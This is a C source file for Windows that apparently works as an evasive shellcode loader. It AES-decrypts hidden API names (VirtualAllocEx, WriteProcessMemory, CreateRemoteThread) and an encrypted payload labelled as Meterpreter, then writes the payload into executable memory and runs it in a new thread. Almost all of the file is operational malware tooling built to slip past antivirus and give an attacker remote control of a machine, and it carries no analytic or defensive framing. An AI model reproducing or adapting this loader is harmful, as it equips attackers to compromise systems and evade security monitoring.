#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>

unsigned char VirtualAllocEx_key[] = { 0x8e, 0x6, 0xe9, 0xcc, 0x31, 0xf9, 0x6a, 0x6b, 0x82, 0x29, 0xd8, 0x86, 0x91, 0x26, 0xfd, 0x22, 0xd6, 0x27, 0x6d, 0x91, 0x14, 0x21, 0x37, 0xfc, 0xa3, 0x50, 0xe2, 0x23, 0x5c, 0x99, 0x82, 0xf2 };
unsigned char VirtualAllocEx_ct[] = { 0xa5, 0xb8, 0x9, 0x9f, 0x2d, 0x30, 0x1d, 0xe3, 0xba, 0xc1, 0x4e, 0xa6, 0x5, 0xb9, 0x65, 0x37 };
typedef LPVOID(WINAPI* VirtAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);


unsigned char WriteProcessMemory_key[] = { 0x14, 0x9a, 0x1b, 0xea, 0x47, 0x53, 0x31, 0x99, 0x29, 0x49, 0xd2, 0x3b, 0x2b, 0x32, 0xdb, 0xe, 0x3, 0xca, 0x6, 0xa3, 0xa3, 0x4c, 0xa2, 0x38, 0xb5, 0xa0, 0xc5, 0x29, 0x8e, 0x89, 0x14, 0x3e };
unsigned char WriteProcessMemory_ct[] = { 0xd7, 0x33, 0xb8, 0x85, 0x5f, 0x38, 0x53, 0xa3, 0xb4, 0xd8, 0x61, 0x23, 0x49, 0xda, 0x44, 0xa5, 0xaa, 0xd6, 0x55, 0xcf, 0x5f, 0x55, 0x1e, 0x6c, 0x14, 0x1e, 0x10, 0x48, 0x3, 0xcd, 0x26, 0x96 };
typedef BOOL(WINAPI* WriteProcMem)(HANDLE  hProcess, LPVOID  lpBaseAddress, LPCVOID lpBuffer, SIZE_T  nSize, SIZE_T* lpNumberOfBytesWritten);


unsigned char CreateRemoteThread_key[] = { 0x4d, 0x2c, 0xfb, 0x5c, 0x4, 0x7f, 0xba, 0x11, 0xf4, 0x99, 0xcb, 0x7f, 0x4d, 0x8c, 0x4d, 0x19, 0xec, 0xc4, 0x27, 0x6c, 0xd, 0xe, 0x38, 0x24, 0x2a, 0xa5, 0x18, 0x7f, 0xbd, 0xda, 0xd6, 0x71 };
unsigned char CreateRemoteThread_ct[] = { 0xae, 0x15, 0x39, 0x65, 0xaa, 0xf0, 0xf2, 0x75, 0xa3, 0x7a, 0x27, 0x90, 0xba, 0x12, 0x77, 0xe6, 0x53, 0x50, 0xfb, 0xe1, 0x55, 0x98, 0x3c, 0x97, 0x1b, 0x18, 0x41, 0xb7, 0xe, 0x53, 0x4a, 0xfe };
typedef HANDLE(WINAPI* CreateRemT)(HANDLE hProcess, LPSECURITY_ATTRIBUTES  lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);


unsigned char payload_key[] = { 0x75, 0xea, 0x1c, 0xb2, 0x17, 0xda, 0xb5, 0x48, 0xd7, 0x47, 0xb3, 0x9e, 0xb5, 0xcc, 0x5f, 0x1a, 0xde, 0xff, 0x13, 0x22, 0xf2, 0x5d, 0xa7, 0xcf, 0x78, 0x2f, 0x35, 0x16, 0x2f, 0xd3, 0x39, 0x31 };
unsigned char payload_ct[] = { 0xf1, 0x2e, 0xf8, 0x5a, 0x9c, 0x11, 0x97, 0x68, 0x7f, 0xf2, 0xe5, 0x30, 0x19, 0x88, 0x8b, 0xe4, 0xd5, 0x1d, 0x3, 0xbd, 0x5d, 0x40, 0x8b, 0xe2, 0xc4, 0x63, 0xcb, 0xe3, 0x10, 0x20, 0x60, 0x54, 0x49, 0x53, 0x6, 0xf, 0x24, 0xba, 0xdc, 0x3e, 0xbe, 0xdf, 0x8, 0xf0, 0xce, 0x31, 0x95, 0x1a, 0xf1, 0xe7, 0x61, 0x18, 0x3, 0xbb, 0x7c, 0xfd, 0xc6, 0x77, 0x50, 0x2b, 0x3d, 0x64, 0xe5, 0x51, 0x3a, 0xca, 0x71, 0xbf, 0x50, 0x44, 0xd1, 0x5d, 0x3, 0x4f, 0x67, 0xe8, 0x6c, 0x9b, 0x70, 0x3, 0x16, 0xd8, 0xae, 0x5, 0xe2, 0x51, 0xe3, 0x82, 0x63, 0x38, 0x7f, 0x77, 0x27, 0xa3, 0x9d, 0x3b, 0xb3, 0x77, 0x31, 0x29, 0x72, 0x90, 0xfd, 0xf7, 0xa4, 0x6, 0x30, 0xdf, 0xf, 0x98, 0xfb, 0x5d, 0xf2, 0xce, 0x39, 0xe4, 0x45, 0x75, 0xf6, 0x6e, 0x5, 0xd0, 0xd0, 0xd9, 0x3e, 0x29, 0x11, 0xa6, 0xce, 0x37, 0xb, 0xcb, 0x7d, 0x7b, 0xc5, 0xf6, 0x1a, 0x8a, 0xf2, 0xc5, 0xfb, 0xa3, 0xb9, 0x44, 0xf7, 0x7e, 0xe6, 0x37, 0x3b, 0x82, 0x41, 0xa0, 0xf2, 0x60, 0x54, 0xff, 0x78, 0x47, 0x2a, 0x4f, 0x34, 0x51, 0xf8, 0x91, 0xee, 0x52, 0xd5, 0x54, 0x78, 0x52, 0xd3, 0x84, 0x87, 0x53, 0x6, 0x15, 0xf9, 0x13, 0x95, 0x4c, 0x4d, 0x32, 0x3a, 0x20, 0xf6, 0xef, 0x55, 0x1a, 0x4a, 0xd9, 0xcc, 0x5a, 0x60, 0x58, 0xb3, 0x41, 0xab, 0x88, 0xa4, 0x2e, 0xcc, 0xb7, 0x5e, 0x6e, 0x3b, 0x54, 0x1d, 0x75, 0x76, 0xde, 0x10, 0x12, 0x5f, 0xc3, 0xe1, 0x6c, 0xc4, 0x37, 0xb6, 0xb6, 0xf4, 0x6, 0xc4, 0x7, 0x80, 0x8b, 0x46, 0x49, 0x5c, 0x90, 0xfa, 0xb2, 0x9b, 0x9e, 0xc9, 0x42, 0x2e, 0xe6, 0x4c, 0x13, 0x29, 0x2a, 0x3f, 0xad, 0xd1, 0x5d, 0xb7, 0x0, 0x75, 0x78, 0x50, 0x1a, 0x81, 0x55, 0x42, 0xaa, 0x2b, 0x18, 0x11, 0x49, 0x30, 0x8c, 0x2c, 0xf7, 0x9c, 0xa5, 0x81, 0x7a, 0x2a, 0xec, 0x50, 0xc5, 0xf, 0x73, 0x4d, 0xea, 0x75, 0x49, 0x41, 0xc8, 0xd3, 0xa0, 0x41, 0x24, 0xf5, 0xdd, 0x4e, 0xa9, 0xeb, 0x89, 0x35, 0xc7, 0xd3, 0xc2, 0xe8, 0x8d, 0x32, 0xb0, 0xbd, 0xc, 0x84, 0x41, 0xdb, 0xdf, 0x3, 0xce, 0xc1, 0x24, 0x8, 0x4b, 0xf8, 0xf5, 0x1b, 0x11, 0xc0, 0xbc, 0x73, 0x68, 0xe4, 0xc5, 0x9, 0x1d, 0xc2, 0x79, 0x18, 0x94, 0xb2, 0x95, 0x82, 0x16, 0xaa, 0x27, 0x79, 0xf, 0xa9, 0xd8, 0x26, 0x4a, 0x93, 0x27, 0x2b, 0xa7, 0x61, 0xc8, 0x8, 0xd, 0x5d, 0x1d, 0x62, 0x44, 0xa4, 0x3f, 0x8e, 0x86, 0x54, 0x94, 0xe8, 0xfe, 0x70, 0x97, 0xcb, 0xc7, 0x7, 0xea, 0xe0, 0x11, 0xd, 0x85, 0xbb, 0x2a, 0x62, 0xd0, 0x91, 0xe0, 0x77, 0x78, 0x52, 0xd0, 0xf9, 0x8e, 0xfe, 0xb6, 0xb8, 0xc0, 0x55, 0xd7, 0x54, 0xf3, 0x43, 0x70, 0xb7, 0xb3, 0x1, 0x8d, 0xb, 0x6b, 0xa, 0x9d, 0xb7, 0x2, 0x68, 0x9d, 0xab, 0xa3, 0x83, 0xc, 0xd5, 0x41, 0xef, 0x63, 0xae, 0x6f, 0x45, 0x25, 0x1f, 0x96, 0x5e, 0xa2, 0x55, 0x28, 0xaa, 0xb6, 0x70, 0x6c, 0x2f, 0xb5, 0xff, 0xdd, 0xf7, 0xc1, 0xc8, 0x14, 0x29, 0x82, 0xc5, 0x94, 0x82, 0xd9, 0x45, 0x1f, 0x7c, 0xfc, 0x4e, 0x20, 0x31, 0x8e, 0xf4, 0x36, 0xdf, 0xac, 0x31, 0xe7, 0x33, 0x5, 0xd, 0xa5, 0xe6, 0x34, 0xe8, 0x7a, 0x39, 0xa9, 0xd3, 0xa3, 0x35, 0xb7, 0x36, 0xa7, 0xeb, 0x86, 0xc7, 0xd4, 0x8e, 0xef, 0x10, 0xc9, 0xf0, 0xa0, 0xed, 0x5f, 0x18, 0x4f, 0x84, 0x8a, 0x26, 0x2e, 0x56, 0x43, 0xd4, 0x99, 0xbb, 0xac, 0x80, 0x6c, 0xec, 0xb6, 0x3b, 0xbb, 0x6e, 0x4a, 0x62, 0x1a, 0xbe, 0xe0, 0x23, 0x3f, 0x12, 0xb7, 0x3f, 0x1e, 0xef, 0x9d };
unsigned int meterpreter_len = 510;


int AESDecrypt(char* cipherText, unsigned int ct_len, char* key, size_t keylen)
{
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return -1;
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) return -1;
	if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) return -1;
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) return -1;
	if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)cipherText, (DWORD*)&ct_len)) return -1;

	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);

	return 0;
}

void main(void) {
	//ShowWindow(GetConsoleWindow(), SW_HIDE);
	VirtAllocEx VAE;
	AESDecrypt((char*)VirtualAllocEx_ct, sizeof(VirtualAllocEx_ct), (char*)VirtualAllocEx_key, sizeof(VirtualAllocEx_key));
	VAE = (VirtAllocEx)GetProcAddress(GetModuleHandleA("kernel32.dll"), (char*)VirtualAllocEx_ct);
	LPVOID addr = VAE(GetCurrentProcess(), NULL, meterpreter_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	SIZE_T bytesWritten;

	WriteProcMem WPM;
	AESDecrypt((char*)WriteProcessMemory_ct, sizeof(WriteProcessMemory_ct), (char*)WriteProcessMemory_key, sizeof(WriteProcessMemory_key));
	WPM = (WriteProcMem)GetProcAddress(GetModuleHandleA("kernel32.dll"), (char*)WriteProcessMemory_ct);
	AESDecrypt((char*)payload_ct, sizeof(payload_ct), (char*)payload_key, sizeof(payload_key));
	WPM(GetCurrentProcess(), addr, (PVOID)payload_ct, (SIZE_T)meterpreter_len, &bytesWritten);

	CreateRemT CRT;
	AESDecrypt((char*)CreateRemoteThread_ct, sizeof(CreateRemoteThread_ct), (char*)CreateRemoteThread_key, sizeof(CreateRemoteThread_key));
	CRT = (CreateRemT)GetProcAddress(GetModuleHandleA("kernel32.dll"), (char*)CreateRemoteThread_ct);
	HANDLE threadHandle = CRT(GetCurrentProcess(), NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, NULL, NULL);

	if (threadHandle != NULL) {
		printf("Payload is running...\n");
		WaitForSingleObject(threadHandle, -1);
		printf("Payload is done\n");
	}
}